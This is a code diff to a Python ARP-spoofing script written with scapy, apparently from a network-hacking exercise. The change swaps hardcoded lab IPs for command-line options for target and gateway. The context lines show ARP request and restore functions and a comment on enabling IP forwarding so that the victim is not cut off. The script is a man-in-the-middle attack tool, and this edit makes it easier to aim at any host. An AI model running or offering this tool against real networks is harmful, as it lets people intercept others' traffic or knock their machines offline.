@@ -3,9 +3,22 @@
 import scapy.all as scapy
 import time
 import sys
+# Optperse allows options in cli
+import optparse
+
+# Define CLI arguments
+def c_arg():
+	parser = optparse.OptionParser()
+	parser.add_option("-t", "--target", dest="target", help="Target IP Address")
+	parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP Address")
+	(options, arguments) = parser.parse_args()
+	if not options.target:
+		parser.error("[-] Please specify a target IP Address")
+	elif not options.gateway:
+		parser.error("[-] Please specify a gateway IP Address")
+	return options
 
 # scapy.ls(scapy.ARP()) # shows scapy options for packet creation
-
 # Get target mac
 def get_mac(ip):
 	arp_request = scapy.ARP(pdst=ip) # see network scanner for notes
@@ -34,9 +47,9 @@ def restore(dest_ip, src_ip):
 	scapy.send(packet, count=4, verbose=false)
 
 # Don't forget to run `echo 1 > /proc/sys/net/ipv4/ip_forward` in a separate terminal window to enable ip forwarding. Otherwise you DoS the target machine
-
-target_ip = "10.0.2.7"
-gateway_ip = "10.0.2.1"
+options = c_arg()
+target_ip = options.target
+gateway_ip = options.gateway
 
 try:
 	packet_count = 0
